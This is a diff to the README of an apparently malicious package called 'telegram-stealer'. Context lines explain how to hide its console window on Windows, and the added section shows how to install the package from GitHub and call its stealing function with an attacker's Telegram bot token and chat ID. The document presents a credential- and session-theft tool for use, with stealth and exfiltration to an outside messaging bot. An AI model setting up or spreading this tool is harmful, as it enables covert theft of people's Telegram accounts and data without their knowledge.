@@ -38,6 +38,22 @@ Run the `hello` binary.
 
 To hide the console window on a Windows machine, you can run the script using the provided VB script (see [`run_hidden_windows.vbs`](./run_hidden_windows.vbs)).
 
+## Include in your project
+
+```sh
+npm install https://github.com/rigwild/telegram-stealer.git
+```
+
+```js
+import { run as stealTelegram } from 'telegram-stealer'
+
+await stealTelegram({
+  telegramChatId: '<chat_id>',
+  telegramToken: '<bot_token>',
+  waitOnStart: false
+})
+```
+
 ## License
 
 [The MIT license](./LICENSE)
